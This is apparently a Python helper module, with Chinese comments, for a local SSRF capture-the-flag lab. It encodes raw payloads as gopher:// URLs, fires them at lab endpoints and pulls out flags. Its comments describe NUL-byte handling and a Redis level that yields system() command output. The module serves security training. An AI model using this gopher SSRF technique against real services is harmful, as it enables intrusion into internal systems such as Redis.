"""靶场公共小工具，只用标准库。

所有关卡都是同一个模式：把 payload 编码成 gopher:// URL，
丢给 web 那台机器的接口，再把响应抠出来。
"""

import re
import urllib.parse
import urllib.request

# 靶场入口，换端口时改这里或设环境变量 LAB_API
API = "http://127.0.0.1:8896"


def gopher_url(host, port, raw):
    """把原始字节编码成 gopher:// URL。

    注意 quote(safe="") —— 连 / 也要编码，否则 payload 里的
    斜杠会被 URL 解析吃掉。%00 在 L5/L6 会保留下来，因为这两关的
    服务端用的是 rawurldecode（curl 的 gopher 实现会被 NUL 截断）。
    """
    return "gopher://%s:%d/_%s" % (host, port, urllib.parse.quote(raw, safe=""))


def send(path, url, timeout=15):
    """打对应关卡接口，返回页面里的响应体纯文本。"""
    qs = urllib.parse.urlencode({"url": url})
    with urllib.request.urlopen("%s/%s?%s" % (API, path, qs), timeout=timeout) as resp:
        html = resp.read().decode("utf-8", "replace")
    m = re.search(r'<pre class="resp-body">(.*?)</pre>', html, re.S)
    return m.group(1) if m else html


def find_flag(text, last=False):
    """从响应里挑一个 flag。

    last=True 取最后一个。L4 必须这么用：响应前面是 Redis 的 RDB 快照，
    里面带着 L3 灌进去的 l3_flag 明文，而 system() 的输出在末尾。
    用 re.search 会先命中 RDB 里那个，看起来像「打穿了但 flag 不对」。
    """
    hits = re.findall(r"flag\{[^}]*\}", text)
    if not hits:
        return None
    return hits[-1] if last else hits[0]


def report(text):
    """打印响应，顺便把 flag 单独拎出来。"""
    print(text.strip())
    f = find_flag(text)
    if f:
        print("\n[+] flag:", f)
    return f
